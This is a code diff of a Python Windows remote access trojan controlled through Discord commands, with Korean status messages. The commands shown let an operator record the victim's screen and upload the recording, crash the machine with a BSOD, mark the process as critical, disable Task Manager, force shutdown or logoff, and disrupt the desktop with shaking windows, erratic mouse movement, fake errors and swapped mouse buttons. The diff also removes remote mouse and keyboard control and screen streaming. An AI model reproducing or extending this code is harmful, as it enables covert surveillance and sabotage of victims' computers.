     if message.content.startswith("!unblockinput"):
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
@@ -1268,6 +1352,7 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed("🔓 **시스템:** 사용자 입력 복원됨."))
         else:
             await message.channel.send(embed=ch3at_embed("이 작업에는 관리자 권한이 필요합니다.", color=0xff0000))
+
     if message.content.startswith("!screenrecord"):
         try:
             seconds = int(message.content[14:].strip())
@@ -1308,6 +1393,7 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed("구문: `!screenrecord <초>` (1-30)", color=0xff0000))
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"화면 녹화 실패: `{str(e)}`", color=0xff0000))
+
     if message.content.startswith("!flipscreen"):
         try:
             arg = message.content[12:].strip().lower()
@@ -1334,54 +1420,28 @@ async def on_message(message):
                 await message.channel.send(embed=ch3at_embed("🔄 **디스플레이:** 화면이 뒤집혔습니다. 되돌리려면 `!flipscreen reset`을 사용하세요."))
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"뒤집기 실패: `{str(e)}`", color=0xff0000))
+
     if message.content.startswith("!crazymouse"):
-        parts = message.content[12:].strip().split()
         try:
-            sec = float(parts[0])
-            if sec < 0.5: sec = 0.5
-            if sec > 120: sec = 120
-            radius = 200
-            speed = 20
-            if len(parts) > 1:
-                radius = float(parts[1])
-                if radius < 10: radius = 10
-                if radius > 1000: radius = 1000
-            if len(parts) > 2:
-                speed = float(parts[2])
-                if speed < 1: speed = 1
-                if speed > 100: speed = 100
-            await message.channel.send(embed=ch3at_embed(f"🐭 **마우스:** {sec}초, 반경 {radius}px, 속도 {speed}회/초"))
-            def _crazy():
+            sec = int(message.content[12:].strip())
+            if sec < 1: sec = 1
+            if sec > 60: sec = 60
+            await message.channel.send(embed=ch3at_embed(f"🐭 **마우스:** {sec}초 동안 미치게 움직입니다..."))
+            def _crazy_mouse():
                 end_t = time.time() + sec
                 sw, sh = pyautogui.size()
-                cx, cy = sw//2, sh//2
                 while time.time() < end_t:
-                    x = cx + random.randint(-radius, radius)
-                    y = cy + random.randint(-radius, radius)
-                    x = max(0, min(sw, x))
-                    y = max(0, min(sh, y))
-                    pyautogui.moveTo(x, y, duration=0.05)
-                    time.sleep(1.0/speed)
-            threading.Thread(target=_crazy, daemon=True).start()
-        except:
-            await message.channel.send(embed=ch3at_embed("구문: `!crazymouse <초> [반경] [속도]` (반경 기본 200, 속도 기본 20)", color=0xff0000))
+                    pyautogui.moveTo(random.randint(0, sw), random.randint(0, sh), duration=0.05)
+            threading.Thread(target=_crazy_mouse, daemon=True).start()
+        except ValueError:
+            await message.channel.send(embed=ch3at_embed("구문: `!crazymouse <초>` (1-60)", color=0xff0000))
+
     if message.content.startswith("!earthquake"):
-        parts = message.content[12:].strip().split()
         try:
-            sec = float(parts[0])
-            if sec < 0.5: sec = 0.5
-            if sec > 120: sec = 120
-            intensity = 15
-            interval = 0.04
-            if len(parts) > 1:
-                intensity = float(parts[1])
-                if intensity < 2: intensity = 2
-                if intensity > 100: intensity = 100
-            if len(parts) > 2:
-                interval = float(parts[2])
-                if interval < 0.01: interval = 0.01
-                if interval > 0.5: interval = 0.5
-            await message.channel.send(embed=ch3at_embed(f"🌍 **지진:** {sec}초, 진폭 {intensity}px, 간격 {interval:.2f}초"))
+            sec = int(message.content[12:].strip())
+            if sec < 1: sec = 1
+            if sec > 30: sec = 30
+            await message.channel.send(embed=ch3at_embed(f"🌍 **지진:** {sec}초 동안 흔듭니다..."))
             def _shake():
                 end_t = time.time() + sec
                 while time.time() < end_t:
@@ -1389,16 +1449,15 @@ async def on_message(message):
                         if win32gui.IsWindowVisible(hwnd):
                             try:
                                 r = win32gui.GetWindowRect(hwnd)
-                                dx = random.randint(-intensity, intensity)
-                                dy = random.randint(-intensity, intensity)
-                                win32gui.MoveWindow(hwnd, r[0]+dx, r[1]+dy, r[2]-r[0], r[3]-r[1], True)
+                                win32gui.MoveWindow(hwnd, r[0]+random.randint(-15,15), r[1]+random.randint(-15,15), r[2]-r[0], r[3]-r[1], True)
                             except: pass
                     try: win32gui.EnumWindows(_enum, None)
                     except: pass
-                    time.sleep(interval)
+                    time.sleep(0.04)
             threading.Thread(target=_shake, daemon=True).start()
-        except:
-            await message.channel.send(embed=ch3at_embed("구문: `!earthquake <초> [진폭] [간격]` (진폭 기본 15, 간격 기본 0.04)", color=0xff0000))
+        except ValueError:
+            await message.channel.send(embed=ch3at_embed("구문: `!earthquake <초>` (1-30)", color=0xff0000))
+
     if message.content.startswith("!fakeerror"):
         try:
             parts = message.content[11:].strip().split(" ", 1)
@@ -1411,6 +1470,7 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed(f"⚠️ **가짜 오류:** {count}개의 오류 상자를 생성합니다."))
         except:
             await message.channel.send(embed=ch3at_embed("구문: `!fakeerror <횟수> <텍스트>`", color=0xff0000))
+
     if message.content.startswith("!spamtts"):
         try:
             parts = message.content[9:].strip().split(" ", 1)
@@ -1426,18 +1486,23 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed(f"🗣️ **TTS 스팸:** '{txt}'을(를) {count}번 말합니다."))
         except:
             await message.channel.send(embed=ch3at_embed("구문: `!spamtts <횟수> <텍스트>`", color=0xff0000))
+
     if message.content == "!opencd":
         ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
         await message.channel.send(embed=ch3at_embed("💿 **CD 트레이:** 열림."))
+
     if message.content == "!closecd":
         ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
         await message.channel.send(embed=ch3at_embed("💿 **CD 트레이:** 닫힘."))
+
     if message.content == "!swapbuttons":
         ctypes.windll.user32.SwapMouseButton(True)
         await message.channel.send(embed=ch3at_embed("🖱️ **마우스:** 버튼 전환됨 (왼쪽 ↔ 오른쪽)."))
+
     if message.content == "!unswapbuttons":
         ctypes.windll.user32.SwapMouseButton(False)
         await message.channel.send(embed=ch3at_embed("🖱️ **마우스:** 버튼이 정상으로 복원됨."))
+
     if message.content == "!hidedesktop":
         try:
             reg_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
@@ -1456,6 +1521,7 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed(f"🖥️ **바탕화면:** 아이콘 {label}."))
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"실패: `{str(e)}`", color=0xff0000))
+
     if message.content == "!bsod":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
@@ -1465,6 +1531,7 @@ async def on_message(message):
             ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(nullptr))
         else:
             await message.channel.send(embed=ch3at_embed("BSOD에는 관리자 권한이 필요합니다.", color=0xff0000))
+
     if message.content == "!jumpscare":
         try:
             volumeup()
@@ -1490,6 +1557,7 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed("👻 **점프스케어:** 실행됨."))
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"점프스케어 실패: `{str(e)}`", color=0xff0000))
+
     if message.content.startswith("!shutdown"):
         try:
             sec = int(message.content[9:].strip())
@@ -1498,12 +1566,15 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed(f"⏻ **시스템:** {sec}초 후 종료."))
         except ValueError:
             await message.channel.send(embed=ch3at_embed("구문: `!shutdown <초>`", color=0xff0000))
+
     if message.content == "!restart":
         subprocess.run(["shutdown", "/r", "/t", "0", "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
         await message.channel.send(embed=ch3at_embed("🔄 **시스템:** 지금 재시작 중."))
+
     if message.content == "!logoff":
         subprocess.run(["shutdown", "/l", "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
         await message.channel.send(embed=ch3at_embed("🚪 **시스템:** 사용자 로그오프."))
+
     if message.content == "!disabletaskmgr":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
@@ -1518,6 +1589,7 @@ async def on_message(message):
                 await message.channel.send(embed=ch3at_embed(f"실패: `{str(e)}`", color=0xff0000))
         else:
             await message.channel.send(embed=ch3at_embed("관리자 권한이 필요합니다.", color=0xff0000))
+
     if message.content == "!enabletaskmgr":
         try:
             reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -1527,6 +1599,7 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed("✅ **시스템:** 작업 관리자 재활성화됨."))
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"실패: `{str(e)}`", color=0xff0000))
+
     if message.content == "!critproc":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
@@ -1534,6 +1607,7 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed("☠️ **시스템:** 프로세스가 중요로 표시됨. 종료 시 BSOD가 발생합니다."))
         else:
             await message.channel.send(embed=ch3at_embed("관리자 권한이 필요합니다.", color=0xff0000))
+
     if message.content == "!uncritproc":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
@@ -1541,9 +1615,11 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed("✅ **시스템:** 프로세스에서 중요 플래그 제거됨."))
         else:
             await message.channel.send(embed=ch3at_embed("관리자 권한이 필요합니다.", color=0xff0000))
+
     if message.content == "!rickroll":
         os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
         await message.channel.send(embed=ch3at_embed("🎵 **Rickroll:** Never gonna give you up..."))
+
     if message.content.startswith("!beep"):
         try:
             count = min(int(message.content[6:].strip()), 100)
@@ -1556,139 +1632,7 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed(f"🔊 **비프:** {count}회 비프 스팸."))
         except ValueError:
             await message.channel.send(embed=ch3at_embed("구문: `!beep <횟수>`", color=0xff0000))
-    if message.content.startswith("!site "):
-        url = message.content[6:].strip()
-        if not url.startswith(("http://", "https://")):
-            url = "https://" + url
-        try:
-            os.startfile(url)
-            await message.channel.send(embed=ch3at_embed(f"🌐 **브라우저 열기:** `{url}`"))
-        except Exception as e:
-            await message.channel.send(embed=ch3at_embed(f"❌ 사이트 열기 실패: `{str(e)}`", color=0xff0000))
-    if message.content == "!mouseposition":
-        try:
-            x, y = pyautogui.position()
-            await message.channel.send(embed=ch3at_embed(f"🖱️ **현재 마우스 위치:** `({x}, {y})`"))
-        except Exception as e:
-            await message.channel.send(embed=ch3at_embed(f"❌ 오류: `{str(e)}`", color=0xff0000))
-    if message.content.startswith("!mousemove "):
-        try:
-            parts = message.content[11:].strip().split()
-            if len(parts) < 2:
-                raise ValueError
-            x, y = int(parts[0]), int(parts[1])
-            pyautogui.moveTo(x, y)
-            await message.channel.send(embed=ch3at_embed(f"🖱️ **마우스 이동:** `({x}, {y})`"))
-        except Exception:
-            await message.channel.send(embed=ch3at_embed("구문: `!mousemove <x> <y>`", color=0xff0000))
-    if message.content.startswith("!mouseclick "):
-        try:
-            parts = message.content[12:].strip().split()
-            if len(parts) < 2:
-                raise ValueError
-            x, y = int(parts[0]), int(parts[1])
-            button = "left"
-            if len(parts) > 2 and parts[2].lower() in ["right", "middle"]:
-                button = parts[2].lower()
-            pyautogui.click(x, y, button=button)
-            await message.channel.send(embed=ch3at_embed(f"🖱️ **클릭:** `({x}, {y})` 버튼: `{button}`"))
-        except Exception:
-            await message.channel.send(embed=ch3at_embed("구문: `!mouseclick <x> <y> [left|right|middle]`", color=0xff0000))
-    if message.content.startswith("!mousedrag "):
-        try:
-            parts = message.content[11:].strip().split()
-            if len(parts) < 4:
-                raise ValueError
-            x1, y1, x2, y2 = map(int, parts[:4])
-            button = "left"
-            if len(parts) > 4 and parts[4].lower() in ["right", "middle"]:
-                button = parts[4].lower()
-            pyautogui.moveTo(x1, y1)
-            pyautogui.drag(x2 - x1, y2 - y1, button=button)
-            await message.channel.send(embed=ch3at_embed(f"🖱️ **드래그:** `({x1},{y1}) → ({x2},{y2})` 버튼: `{button}`"))
-        except Exception:
-            await message.channel.send(embed=ch3at_embed("구문: `!mousedrag <x1> <y1> <x2> <y2> [button]`", color=0xff0000))
-    if message.content.startswith("!keypress "):
-        key = message.content[10:].strip().lower()
-        try:
-            pyautogui.press(key)
-            await message.channel.send(embed=ch3at_embed(f"⌨️ **키 입력:** `{key}`"))
-        except Exception as e:
-            await message.channel.send(embed=ch3at_embed(f"❌ 키 입력 실패: `{str(e)}`", color=0xff0000))
-    if message.content == "!stream":
-        if streaming_active:
-            await message.channel.send(embed=ch3at_embed("⚠️ 이미 스트리밍 중입니다. `!stopstream`으로 중지하세요.", color=0xff0000))
-        else:
-            streaming_active = True
-            streaming_stop_event.clear()
-            await message.channel.send(embed=ch3at_embed("📡 **스트리밍 시작:** 3초 간격, 최대 20프레임. `!stopstream`으로 중지."))
-            streaming_thread = threading.Thread(target=stream_screenshots, args=(message.channel,), daemon=True)
-            streaming_thread.start()
-    if message.content == "!stopstream":
-        if streaming_active:
-            streaming_stop_event.set()
-            await message.channel.send(embed=ch3at_embed("🛑 **스트리밍 중지됨**"))
-        else:
-            await message.channel.send(embed=ch3at_embed("ℹ️ 현재 스트리밍 중이 아닙니다."))
-    if message.content.startswith("!recordvideo "):
-        try:
-            seconds = int(message.content[13:].strip())
-            if seconds < 1: seconds = 1
-            if seconds > 30: seconds = 30
-            await message.channel.send(embed=ch3at_embed(f"🎥 **비디오 녹화:** {seconds}초 (OpenCV 사용)..."))
-            if not CV2_AVAILABLE:
-                await message.channel.send(embed=ch3at_embed("⚠️ OpenCV가 설치되지 않아 ZIP 프레임 방식으로 대체합니다."))
-                temp = os.getenv('TEMP')
-                frames_dir = os.path.join(temp, "vid_frames")
-                os.makedirs(frames_dir, exist_ok=True)
-                frame_files = []
-                fps = 10
-                total_frames = seconds * fps
-                with mss() as sct:
-                    for i in range(total_frames):
-                        filename = os.path.join(frames_dir, f"frame_{i:04d}.png")
-                        sct.shot(output=filename)
-                        frame_files.append(filename)
-                        await asyncio.sleep(1.0 / fps)
-                zip_path = os.path.join(temp, "video_frames.zip")
-                with ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-                    for f in frame_files:
-                        zf.write(f, os.path.basename(f))
-                file = discord.File(zip_path, filename="video_frames.zip")
-                await message.channel.send(embed=ch3at_embed(f"🎬 **비디오 (ZIP):** {seconds}초, {len(frame_files)}프레임"), file=file)
-                for f in frame_files:
-                    try: os.remove(f)
-                    except: pass
-                try: os.rmdir(frames_dir)
-                except: pass
-                os.remove(zip_path)
-                return
-            temp = os.getenv('TEMP')
-            output_path = os.path.join(temp, "recording.mp4")
-            screen_size = (pyautogui.size().width, pyautogui.size().height)
-            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
-            out = cv2.VideoWriter(output_path, fourcc, 10.0, screen_size)
-            with mss() as sct:
-                monitor = sct.monitors[1]
-                start_time = time.time()
-                while time.time() - start_time < seconds:
-                    img = sct.grab(monitor)
-                    frame = np.array(img)
-                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
-                    out.write(frame)
-                    await asyncio.sleep(0.1)
-            out.release()
-            if os.path.exists(output_path):
-                file = discord.File(output_path, filename="recording.mp4")
-                await message.channel.send(embed=ch3at_embed(f"🎥 **MP4 영상:** {seconds}초 녹화 완료."), file=file)
-                os.remove(output_path)
-            else:
-                await message.channel.send(embed=ch3at_embed("❌ 비디오 파일 생성 실패.", color=0xff0000))
-        except ValueError:
-            await message.channel.send(embed=ch3at_embed("구문: `!recordvideo <초>` (1-30)", color=0xff0000))
-        except Exception as e:
-            await message.channel.send(embed=ch3at_embed(f"비디오 녹화 실패: `{str(e)}`", color=0xff0000))
+
     await bot.process_commands(message)
 
-if __name__ == "__main__":
-    bot.run(token)
+bot.run(token)
